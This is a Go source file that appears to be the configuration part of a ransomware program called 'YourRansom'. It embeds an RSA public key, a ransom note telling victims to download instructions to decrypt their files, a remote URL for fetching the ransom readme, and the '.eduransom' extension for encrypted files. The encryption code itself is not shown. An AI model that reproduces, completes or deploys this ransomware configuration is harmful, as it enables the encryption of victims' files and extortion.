package main

var (
	//	RSA公钥
	pubKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHWoOE/sqnbgTniKDSjWWJySGm
/Y9UXgIUpB0jXqP/LN2gfNfoMKkCBGLV8VWS0G18Uw1JvUTL55fNxx/Sams5n3Cj
twfGD10iVAWDq3yt28m+VYd2uD3xROV5m95IfeppqSokznlJDd7pjFp0jzE7BX1E
09f86MTK82Ppi0PS0wIDAQAB
-----END PUBLIC KEY-----`)

	//	离线readme设置，如未配置在线下载或下载失败则使用离线readme
	readme         = []byte(`Just smile :) Please download readme file from https://goo.gl/A7lrFT to decrypt your files. `)
	readmeFilename = "README.txt"

	//	在线readme下载设置，留空为不使用
	readmeUrl         = "http://ys-j.ys168.com/566932934/m4M157735JKPFTU6jsS9/readme.doc"
	readmeNetFilename = "README.doc"

	//	运行时的提示信息
	alert = []byte(`Hey guys, why not care?`)

	//	自定义文件后缀名
	filesuffix = ".eduransom"

	//	key与dkey文件名的设置
	keyFilename  = "YourRansom.key"
	dkeyFilename = "YourRansom.dkey"
)
